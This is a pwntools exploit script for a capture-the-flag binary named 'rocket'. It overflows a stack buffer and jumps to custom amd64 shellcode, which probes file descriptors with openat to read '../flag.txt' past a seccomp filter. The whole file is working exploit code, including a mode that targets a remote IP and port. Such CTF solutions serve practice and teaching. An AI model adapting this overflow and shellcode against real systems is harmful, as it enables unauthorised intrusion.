from pwn import *
import argparse

context.terminal = "/bin/bash"
context.aslr = False
binary_name = "./rocket"
context.binary = binary_name
elf = context.binary

OVERFLOW_LEN=0x828

# idea here is to loop over every FD and attempt to open "../flag.txt". If the
# return of the openat call is non0-negative we know we have it. Write flag to
# STDOUT
shellcode = """

    xor rdi, rdi     # get rdi to 3 initially
    inc rdi
    inc rdi
    inc rdi

try_again:
    inc rdi               # increment test fd
    lea rsi, [rip + flag]
    mov rdx, O_RDONLY
    mov rax, SYS_openat
    syscall
    test rax, rax
    js try_again

win:
    push rax            # read flag into memory
    pop rdi
    mov rsi, PTR_ADDR    # this will be the addr of our buffer - 30
    mov rdx, 0x30
    mov rax, SYS_read
    syscall

    xor rdi, rdi          # write flag to STDOUT
    inc rdi
    mov rax, SYS_write
    syscall

flag:
    .ascii "../flag.txt"
"""

r = None
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", help="remote ip", type=str, required=False, 
                        default="172.17.0.2")
    parser.add_argument("--port", help="remote port", type=int, required=False, 
                        default=4444)
    parser.add_argument("--debug", help="shows more verbose output", 
                        required=False, action="store_true", default=False)
    parser.add_argument("--pause", help="pause on start. Makes it easier to attach a debugger", 
                        action="store_true", default=False, required=False)
    parser.add_argument("--live", help="throw at the IP/port args provided to this program", 
                        action="store_true", default=False)
    parser.add_argument("--strace", 
                        help="enable strace run", 
                        action="store_true",
                        default=False)
    args = parser.parse_args()

    if(args.debug):
        context.log_level = "debug"

    global r
    if(args.live):
        r = remote(args.ip, args.port)
    elif(args.strace):
        r = process(["strace", binary_name])
    else:
        r = process(binary_name)

    if(args.pause):
        pause()
  
    # stack buffer overflow into an env with seccomp enabled. Use openat and
    # the unclosed /tmp dir fd to read the flag
    # NX is disabled so just jump exection to our buffer. Program outputs
    # buffer address as a gift
    r.recvuntil(b"journey:")
    buffer_addr = int(r.recvuntil("\n"), 16)

    # pad shellcode to achieve overflow
    stamped_shellcode = shellcode.replace("PTR_ADDR", hex(buffer_addr-0x30))
    assembled_shellcode = asm(stamped_shellcode, arch="amd64")

    if(b"\x0a" in assembled_shellcode):
        log.warn("newline in shellcode. This could cause issues")

    assembled_shellcode += (OVERFLOW_LEN - len(assembled_shellcode)) * b"\0"
    assembled_shellcode += p64(buffer_addr)

    log.info("sending payload...")
    r.sendline(assembled_shellcode)

    r.interactive() 
    return 0 

if __name__ == "__main__":
    return_code = main()
    if(return_code == 1):
        log.error("Exploit failed.")
    elif(return_code == 0):
        log.success("Win!")
    else:
        log.warn("Bad return code.")


